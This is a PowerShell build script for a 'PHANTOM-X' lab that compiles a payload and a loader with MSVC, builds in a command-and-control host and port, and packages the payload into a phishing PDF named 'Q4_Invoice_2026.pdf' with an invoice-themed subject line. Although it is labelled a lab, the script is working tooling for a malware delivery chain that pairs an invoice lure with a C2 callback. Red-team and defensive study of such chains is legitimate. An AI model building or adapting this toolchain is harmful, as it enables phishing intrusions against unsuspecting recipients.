#Requires -Version 5.1
<#
.SYNOPSIS
    PHANTOM-X :: build_lab.ps1 -- build the loader and payload with MSVC.

.DESCRIPTION
    Builds px_payload.exe and px_loader.exe on a Windows machine that has
    Visual Studio Build Tools installed, then regenerates the attack-chain PDF.

    The MinGW build (build_lab.sh) is the verified path. This script exists so
    the lab can be rebuilt natively. Note two differences from the MinGW build:

      * MSVC needs /Zl (omit default library) and /NODEFAULTLIB so that the
        freestanding memcpy/memset/memmove in px_payload.c are the ones used.
      * The loader needs a zlib for Windows. If you do not have one, build the
        loader with MinGW instead, or store the embedded file uncompressed.

.EXAMPLE
    .\build_lab.ps1 -C2Host 192.168.56.1 -C2Port 9001
#>
[CmdletBinding()]
param(
    [string]$C2Host = '127.0.0.1',
    [int]$C2Port = 9001,
    [string]$OutputDir = $PSScriptRoot,
    [string]$Python = 'python'
)

$ErrorActionPreference = 'Stop'

function Find-MSVC {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $path = & $vswhere -latest -products * `
            -requires Microsoft.VisualStudio.Component.VC.Tools.x86.x64 `
            -property installationPath
        if ($path) {
            $vcvars = Join-Path $path 'VC\Auxiliary\Build\vcvars64.bat'
            if (Test-Path $vcvars) { return $vcvars }
        }
    }
    $legacy = "${env:ProgramFiles(x86)}\Microsoft Visual Studio 2019\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
    if (Test-Path $legacy) { return $legacy }
    return $null
}

$vcvars = Find-MSVC
if (-not $vcvars) {
    Write-Host '[!] Visual Studio Build Tools (v142/v143 x64) not found.' -ForegroundColor Red
    Write-Host '    Install "Desktop development with C++" or use the MinGW build.' -ForegroundColor Yellow
    exit 1
}

$here = $PSScriptRoot
$root = Split-Path (Split-Path $here -Parent) -Parent
$payload = Join-Path $OutputDir 'px_payload.exe'
$loader = Join-Path $OutputDir 'px_loader.exe'

Write-Host '==> initialising MSVC environment' -ForegroundColor Cyan
$bat = "`"$vcvars`" && set"
$envLines = & cmd.exe /c $bat
foreach ($line in $envLines) {
    if ($line -match '^([^=]+)=(.*)$') {
        Set-Item -Path "Env:$($matches[1])" -Value $matches[2] -ErrorAction SilentlyContinue
    }
}

$cl = Get-Command cl.exe -ErrorAction SilentlyContinue
if (-not $cl) { Write-Host '[!] cl.exe not on PATH after vcvars' -ForegroundColor Red; exit 1 }

Push-Location $here
try {
    Write-Host '==> building payload (freestanding, entry=px_entry)' -ForegroundColor Cyan
    & cl.exe /nologo /O2 /W4 /GS- /Zl /c px_payload.c "/DPX_DEFAULT_HOST=`"$C2Host`"" "/DPX_DEFAULT_PORT=$C2Port"
    if ($LASTEXITCODE -ne 0) { throw "payload compile failed ($LASTEXITCODE)" }
    & link.exe /nologo /NOENTRY /ENTRY:px_entry /SUBSYSTEM:CONSOLE `
        /OUT:"$payload" px_payload.obj ws2_32.lib kernel32.lib /NODEFAULTLIB
    if ($LASTEXITCODE -ne 0) { throw "payload link failed ($LASTEXITCODE)" }
    Write-Host "    $payload" -ForegroundColor Green

    Write-Host '==> building loader' -ForegroundColor Cyan
    Write-Host '    (needs a Windows zlib: add /I<zlib-include> /link <zlib.lib>)' -ForegroundColor DarkGray
    & cl.exe /nologo /O2 /W4 px_loader.c /link ws2_32.lib /OUT:"$loader"
    if ($LASTEXITCODE -ne 0) { throw "loader build failed ($LASTEXITCODE)" }
    Write-Host "    $loader" -ForegroundColor Green
} finally {
    Pop-Location
}

Write-Host '==> generating attack-chain PDF' -ForegroundColor Cyan
$pdf = Join-Path $root 'phase1_pdf\samples\px_attack_chain.pdf'
& $Python (Join-Path $root 'phase1_pdf\make_attack_pdf.py') `
    --payload $payload --out $pdf `
    --name 'Q4_Invoice_2026.pdf' --attachment 'Q4 Invoice' `
    --subject 'Q4 Invoice for review'
if ($LASTEXITCODE -ne 0) { throw "PDF generation failed ($LASTEXITCODE)" }

Write-Host ''
Write-Host 'build complete.' -ForegroundColor Green
Write-Host "  loader : $loader" -ForegroundColor Green
Write-Host "  payload: $payload" -ForegroundColor Green
Write-Host "  pdf    : $pdf" -ForegroundColor Green
Write-Host "  c2     : ${C2Host}:${C2Port}" -ForegroundColor Green
Write-Host ''
Write-Host 'next:  python3 phase5_network\test_chain_integration.py' -ForegroundColor Green
